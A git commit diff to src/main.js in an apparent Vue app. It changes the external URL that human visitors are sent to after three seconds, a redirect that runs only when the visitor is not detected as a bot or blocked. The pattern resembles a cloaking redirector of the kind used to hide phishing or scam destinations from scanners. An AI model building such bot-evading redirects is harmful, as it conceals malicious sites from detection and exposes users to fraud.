7083d3cf502f54f080bf333a9443626dc315f2a0
husknet <127146284+husknet@users.noreply.github.com>
2025-01-30 07:16:34 -0400

    Update main.js

--- src/main.js
+++ src/main.js
@@ -48,7 +48,7 @@ const app = createApp({
       // If not blocked or bot, proceed to the main page
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://trol.fauxmacho.com/';
+          window.location.href = 'https://om.desario.com.br/';
         }, 3000);
       }
 
